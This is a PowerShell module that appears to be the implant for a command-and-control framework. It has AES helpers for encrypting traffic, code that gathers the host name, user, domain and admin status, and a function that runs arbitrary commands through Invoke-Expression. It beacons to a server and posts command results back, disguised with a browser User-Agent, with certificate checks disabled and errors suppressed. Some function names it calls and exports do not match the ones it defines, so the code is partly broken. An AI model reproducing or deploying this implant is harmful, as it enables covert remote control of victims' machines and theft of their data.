# Encryption functions
function Get-EncryptionKey {
    param([SecureString]$Password = "your-encryption-password-here")
    
    $salt = [System.Text.Encoding]::UTF8.GetBytes("c2_infrastructure_salt_2024")
    $iterations = 100000
    
    $key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, $iterations)
    return [Convert]::ToBase64String($key.GetBytes(32))
}

function Protect-Data {
    param([string]$Data, [string]$Key)
    
    try {
        $keyBytes = [Convert]::FromBase64String($Key)
        $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        
        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
        $encryptedData = $encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
        
        # Combine IV and encrypted data
        $combined = $aes.IV + $encryptedData
        return [Convert]::ToBase64String($combined)
    }
    catch {
        return $null
    }
}

function Unprotect-Data {
    param([string]$EncryptedData, [string]$Key)
    
    try {
        $keyBytes = [Convert]::FromBase64String($Key)
        $combined = [Convert]::FromBase64String($EncryptedData)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        # Extract IV (first 16 bytes)
        $iv = $combined[0..15]
        $encryptedData = $combined[16..($combined.Length - 1)]
        
        $aes.IV = $iv
        
        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
        $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
        
        return [System.Text.Encoding]::UTF8.GetString($decryptedData)
    }
    catch {
        return $null
    }
}

# System information gathering
function Get-SystemInfo {
    $info = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os_type = "Windows"
        os_version = [System.Environment]::OSVersion.VersionString
        domain = $env:USERDOMAIN
        is_admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    return $info
}

# Command execution
function Invoke-CommandLocal {
    param([string]$Command)
    
    try {
        # Execute command and capture output
        $output = Invoke-Expression -Command $Command 2>&1 | Out-String
        return $output
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

# HTTP communication
function Send-Beacon {
    param(
        [string]$ServerURL,
        [string]$AuthToken,
        [string]$SessionID,
        [string]$EncryptionKey
    )
    
    try {
        # Gather system info
        $sysInfo = Get-SystemInfo
        
        if ($SessionID) {
            $sysInfo['session_id'] = $SessionID
        }
        
        # Convert to JSON
        $jsonData = $sysInfo | ConvertTo-Json -Compress
        
        # Encrypt data
        $encryptedData = Encrypt-Data -Data $jsonData -Key $EncryptionKey
        
        # Prepare request
        $body = @{
            data = $encryptedData
        } | ConvertTo-Json
        
        $headers = @{
            'Authorization' = "Bearer $AuthToken"
            'Content-Type' = 'application/json'
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Ignore SSL errors (for self-signed certs)
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        
        # Send beacon
        $response = Invoke-RestMethod -Uri "$ServerURL/api/v1/sync" `
                                      -Method Post `
                                      -Body $body `
                                      -Headers $headers `
                                      -TimeoutSec 30
        
        if ($response.status -eq 'success') {
            # Decrypt response
            $decrypted = Decrypt-Data -EncryptedData $response.data -Key $EncryptionKey
            $responseData = $decrypted | ConvertFrom-Json
            
            return $responseData
        }
    }
    catch {
        # Silent failure
        return $null
    }
}

function Submit-Results {
    param(
        [string]$ServerURL,
        [string]$AuthToken,
        [string]$SessionID,
        [string]$TaskID,
        [string]$Output,
        [string]$EncryptionKey
    )
    
    try {
        $resultData = @{
            session_id = $SessionID
            task_id = $TaskID
            output = $Output
        } | ConvertTo-Json -Compress
        
        $encryptedData = Encrypt-Data -Data $resultData -Key $EncryptionKey
        
        $body = @{
            data = $encryptedData
        } | ConvertTo-Json
        
        $headers = @{
            'Authorization' = "Bearer $AuthToken"
            'Content-Type' = 'application/json'
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        
        $response = Invoke-RestMethod -Uri "$ServerURL/api/v1/results" `
                                      -Method Post `
                                      -Body $body `
                                      -Headers $headers `
                                      -TimeoutSec 30
        
        return ($response.status -eq 'success')
    }
    catch {
        return $false
    }
}

Export-ModuleMember -Function Get-EncryptionKey, Encrypt-Data, Decrypt-Data, Get-SystemInfo, Invoke-CommandLocal, Send-Beacon, Submit-Results